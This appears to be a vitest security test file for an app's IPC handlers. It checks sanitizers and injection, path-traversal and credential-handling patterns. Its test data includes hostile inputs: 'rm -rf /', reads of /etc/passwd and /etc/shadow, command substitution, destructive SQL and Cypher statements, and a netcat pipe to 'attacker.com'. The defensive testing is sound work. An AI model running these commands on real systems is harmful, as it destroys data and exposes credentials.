/**
 * Security-focused tests for IPC handlers
 * Tests input sanitization, injection prevention, and validation
 */
import { describe, it, expect, vi } from 'vitest'
import '../setup'

describe('IPC Security Tests', () => {
  describe('Input Sanitization Functions', () => {
    // Recreate sanitization functions for testing
    const sanitizeServiceName = (name: string): string => {
      return name.replace(/[^a-zA-Z0-9._@-]/g, '')
    }

    const sanitizeContainerId = (id: string): string => {
      return id.replace(/[^a-zA-Z0-9._-]/g, '')
    }

    const sanitizeModelName = (model: string): string => {
      return model.replace(/[^a-zA-Z0-9._:/-]/g, '')
    }

    describe('sanitizeServiceName', () => {
      it('should allow valid service names', () => {
        expect(sanitizeServiceName('nginx')).toBe('nginx')
        expect(sanitizeServiceName('postgresql@14-main')).toBe('postgresql@14-main')
        expect(sanitizeServiceName('my.service')).toBe('my.service')
        expect(sanitizeServiceName('test_service')).toBe('test_service')
      })

      it('should remove shell injection characters', () => {
        // Sanitization removes all non-allowed characters (keeps only a-zA-Z0-9._@-)
        expect(sanitizeServiceName('nginx; rm -rf /')).toBe('nginxrm-rf')
        expect(sanitizeServiceName('service$(whoami)')).toBe('servicewhoami')
        expect(sanitizeServiceName('test`id`')).toBe('testid')
        expect(sanitizeServiceName('name|cat /etc/passwd')).toBe('namecatetcpasswd')
      })

      it('should remove path traversal attempts', () => {
        // Dots and hyphens are allowed, so .. becomes .. but / is removed
        expect(sanitizeServiceName('../../../etc/passwd')).toBe('......etcpasswd')
        expect(sanitizeServiceName('/etc/shadow')).toBe('etcshadow')
      })

      it('should handle empty and whitespace input', () => {
        expect(sanitizeServiceName('')).toBe('')
        expect(sanitizeServiceName('   ')).toBe('')
      })
    })

    describe('sanitizeContainerId', () => {
      it('should allow valid container IDs', () => {
        expect(sanitizeContainerId('abc123def456')).toBe('abc123def456')
        expect(sanitizeContainerId('my-container')).toBe('my-container')
        expect(sanitizeContainerId('container_name')).toBe('container_name')
        expect(sanitizeContainerId('v1.0.0')).toBe('v1.0.0')
      })

      it('should remove shell injection characters', () => {
        expect(sanitizeContainerId('container;whoami')).toBe('containerwhoami')
        expect(sanitizeContainerId('test$(id)')).toBe('testid')
        expect(sanitizeContainerId('name|ls')).toBe('namels')
      })

      it('should block @ symbol (unlike service names)', () => {
        expect(sanitizeContainerId('user@container')).toBe('usercontainer')
      })
    })

    describe('sanitizeModelName', () => {
      it('should allow valid Ollama model names', () => {
        expect(sanitizeModelName('llama2')).toBe('llama2')
        expect(sanitizeModelName('llama2:7b')).toBe('llama2:7b')
        expect(sanitizeModelName('mistral:latest')).toBe('mistral:latest')
        expect(sanitizeModelName('library/model')).toBe('library/model')
        expect(sanitizeModelName('user/model:v1.0')).toBe('user/model:v1.0')
      })

      it('should remove shell injection characters', () => {
        expect(sanitizeModelName('model;whoami')).toBe('modelwhoami')
        expect(sanitizeModelName('test$(id)')).toBe('testid')
        expect(sanitizeModelName('name`ls`')).toBe('namels')
      })

      it('should allow forward slashes for namespaces', () => {
        expect(sanitizeModelName('namespace/model')).toBe('namespace/model')
      })
    })
  })

  describe('SQL Injection Prevention', () => {
    it('should identify dangerous DROP statements', () => {
      const dangerousQueries = [
        'DROP TABLE users',
        'DROP DATABASE production',
        'DROP INDEX idx_users',
        'drop table if exists secrets',
        'DROP SCHEMA public CASCADE',
      ]

      for (const query of dangerousQueries) {
        expect(query.toLowerCase()).toMatch(/drop\s+(table|database|index|schema)/i)
      }
    })

    it('should identify dangerous TRUNCATE statements', () => {
      const dangerousQueries = ['TRUNCATE users', 'TRUNCATE TABLE sessions', 'truncate learnings']

      for (const query of dangerousQueries) {
        expect(query.toLowerCase()).toMatch(/truncate/i)
      }
    })

    it('should identify dangerous DELETE without WHERE', () => {
      const dangerousQueries = ['DELETE FROM users', 'delete from sessions']

      for (const query of dangerousQueries) {
        // Match DELETE FROM table_name without WHERE
        expect(query).toMatch(/delete\s+from\s+\w+\s*$/i)
      }
    })

    it('should allow safe parameterized queries', () => {
      const safeQueries = [
        'SELECT * FROM users WHERE id = $1',
        'INSERT INTO logs (message) VALUES ($1)',
        'UPDATE users SET name = $1 WHERE id = $2',
        'DELETE FROM sessions WHERE expired_at < $1',
      ]

      for (const query of safeQueries) {
        // Should contain parameter placeholders
        expect(query).toMatch(/\$\d+/)
      }
    })
  })

  describe('Cypher Injection Prevention', () => {
    it('should identify dangerous DETACH DELETE', () => {
      const dangerousQueries = ['MATCH (n) DETACH DELETE n', 'MATCH (n:User) DETACH DELETE n']

      for (const query of dangerousQueries) {
        expect(query.toLowerCase()).toMatch(/detach\s+delete/i)
      }
    })

    it('should identify dangerous unrestricted MATCH DELETE', () => {
      const dangerousQueries = ['MATCH (n) DELETE n', 'MATCH (n:Node) DELETE n']

      for (const query of dangerousQueries) {
        expect(query.toLowerCase()).toMatch(/match\s*\([^)]+\)\s*delete/i)
      }
    })

    it('should allow safe Cypher queries', () => {
      const safeQueries = [
        'MATCH (n:User {id: $id}) RETURN n',
        'MATCH (a)-[r]->(b) WHERE a.id = $id RETURN a, r, b',
        'CREATE (n:Node {name: $name}) RETURN n',
      ]

      for (const query of safeQueries) {
        // Should not match dangerous patterns
        expect(query.toLowerCase()).not.toMatch(/detach\s+delete/i)
      }
    })
  })

  describe('Path Traversal Prevention', () => {
    it('should detect path traversal attempts', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM',
        '....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2fetc/passwd', // URL encoded
      ]

      for (const path of maliciousPaths) {
        // Should contain traversal patterns
        const hasTraversal =
          path.includes('..') ||
          path.startsWith('/etc') ||
          path.startsWith('/') ||
          path.includes('\\') ||
          path.includes('%2e')
        expect(hasTraversal).toBe(true)
      }
    })

    it('should allow safe relative paths within project', () => {
      const safePaths = [
        'src/components/Button.tsx',
        './config.json',
        'package.json',
        'src/main/index.ts',
      ]

      for (const path of safePaths) {
        expect(path).not.toMatch(/\.\.[/\\]/)
        expect(path).not.toMatch(/^\/(?!home)/) // Allow /home paths
      }
    })
  })

  describe('Command Injection Prevention', () => {
    it('should detect command chaining attempts', () => {
      const maliciousInputs = [
        'input; rm -rf /',
        'input && cat /etc/passwd',
        'input || whoami',
        'input | nc attacker.com 4444',
        'input\nwhoami',
        'input`id`',
        '$(whoami)',
        '${IFS}cat${IFS}/etc/passwd',
      ]

      const dangerousPatterns = /[;&|`$\n]/

      for (const input of maliciousInputs) {
        expect(input).toMatch(dangerousPatterns)
      }
    })
  })
})

describe('Credential Security Tests', () => {
  it('should not log credential values', () => {
    const consoleSpy = vi.spyOn(console, 'error')

    // Simulate a credential error - should not include the actual value
    const sensitiveValue = 'super-secret-password-123'
    const safeErrorMessage = 'Failed to store credential: Invalid key format'

    console.error(safeErrorMessage)

    expect(consoleSpy).toHaveBeenCalledWith(safeErrorMessage)
    expect(consoleSpy).not.toHaveBeenCalledWith(expect.stringContaining(sensitiveValue))

    consoleSpy.mockRestore()
  })

  it('should validate credential key format', () => {
    const validKeys = ['api_key', 'GITHUB_TOKEN', 'db-password', 'secret.key']
    const invalidKeys = ['', '   ', '../../../etc/passwd', 'key;whoami']

    for (const key of validKeys) {
      expect(key.trim().length).toBeGreaterThan(0)
      expect(key).not.toMatch(/[;&|`$]/)
    }

    for (const key of invalidKeys) {
      const isInvalid = key.trim().length === 0 || /[;&|`$]|\.\.\//.test(key)
      expect(isInvalid).toBe(true)
    }
  })
})
